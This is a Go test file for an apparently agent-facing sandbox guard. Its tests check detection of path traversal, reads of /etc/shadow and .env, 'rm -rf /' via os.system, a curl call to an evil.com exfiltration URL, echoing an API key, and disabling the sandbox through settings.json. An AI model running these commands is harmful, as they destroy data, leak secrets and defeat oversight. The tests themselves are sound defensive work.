package sandguard

import (
	"testing"
)

func TestCheckPathTraversal(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threat := g.CheckPath("../../etc/passwd")
	if threat == nil {
		t.Error("should detect path traversal")
	}
	if threat.Category != "path_traversal" {
		t.Errorf("expected path_traversal, got %s", threat.Category)
	}
}

func TestCheckPathSensitive(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threat := g.CheckPath("/etc/shadow")
	if threat == nil || threat.Severity != "critical" {
		t.Error("should detect sensitive system path as critical")
	}
}

func TestCheckPathSensitiveFile(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threat := g.CheckPath("/project/.env")
	if threat == nil {
		t.Error("should detect .env file access")
	}
	if threat.Category != "config" {
		t.Errorf("expected config, got %s", threat.Category)
	}
}

func TestCheckPathClean(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threat := g.CheckPath("/home/user/project/main.go")
	if threat != nil {
		t.Error("clean path should not trigger")
	}
}

func TestCheckPathAllowed(t *testing.T) {
	g := NewGuard(Config{
		AllowedPaths: []string{"/home/user/project"},
	})

	threat := g.CheckPath("/home/user/project/../project/main.go")
	if threat != nil {
		t.Error("traversal within allowed paths should be ok")
	}
}

func TestCheckCommandExec(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threats := g.CheckCommand("os.system('rm -rf /')")
	if len(threats) == 0 {
		t.Error("should detect exec attempt")
	}

	found := false
	for _, th := range threats {
		if th.Category == "exec" {
			found = true
		}
	}
	if !found {
		t.Error("should have exec category threat")
	}
}

func TestCheckCommandNetwork(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threats := g.CheckCommand("curl https://evil.com/exfil")
	hasNetwork := false
	for _, th := range threats {
		if th.Category == "network" {
			hasNetwork = true
		}
	}
	if !hasNetwork {
		t.Error("should detect network access")
	}
}

func TestCheckCommandEnvExfil(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threats := g.CheckCommand("echo $ANTHROPIC_API_KEY")
	hasEnv := false
	for _, th := range threats {
		if th.Category == "env_exfil" {
			hasEnv = true
		}
	}
	if !hasEnv {
		t.Error("should detect env var exfiltration")
	}
}

func TestCheckCommandConfig(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threats := g.CheckCommand("edit settings.json to disable sandbox")
	hasConfig := false
	for _, th := range threats {
		if th.Category == "config" {
			hasConfig = true
		}
	}
	if !hasConfig {
		t.Error("should detect sandbox config modification")
	}
}

func TestCheckCommandClean(t *testing.T) {
	g := NewGuard(Config{AllowExec: true, AllowNetwork: true})

	threats := g.CheckCommand("go build ./...")
	if len(threats) != 0 {
		t.Error("clean command should not trigger")
	}
}

func TestCheckToolUse(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threats := g.CheckToolUse("bash", map[string]string{
		"command": "curl https://evil.com",
	})
	if len(threats) == 0 {
		t.Error("should detect threat in tool args")
	}
}

func TestCheckToolUsePath(t *testing.T) {
	g := NewGuard(DefaultConfig())

	threats := g.CheckToolUse("read", map[string]string{
		"file_path": "/etc/shadow",
	})
	if len(threats) == 0 {
		t.Error("should detect sensitive path in tool args")
	}
}

func TestIsSafe(t *testing.T) {
	if !IsSafe(nil) {
		t.Error("nil threats should be safe")
	}
	if IsSafe([]Threat{{Category: "exec"}}) {
		t.Error("threats should not be safe")
	}
}

func TestMaxSeverity(t *testing.T) {
	threats := []Threat{
		{Severity: "low"},
		{Severity: "critical"},
		{Severity: "medium"},
	}
	if MaxSeverity(threats) != "critical" {
		t.Errorf("expected critical, got %s", MaxSeverity(threats))
	}
}

func TestMaxSeverityEmpty(t *testing.T) {
	if MaxSeverity(nil) != "" {
		t.Error("empty threats should return empty severity")
	}
}

func TestAllowExec(t *testing.T) {
	g := NewGuard(Config{AllowExec: true})
	threats := g.CheckCommand("subprocess.run(['ls'])")
	hasExec := false
	for _, th := range threats {
		if th.Category == "exec" {
			hasExec = true
		}
	}
	if hasExec {
		t.Error("should not flag exec when allowed")
	}
}
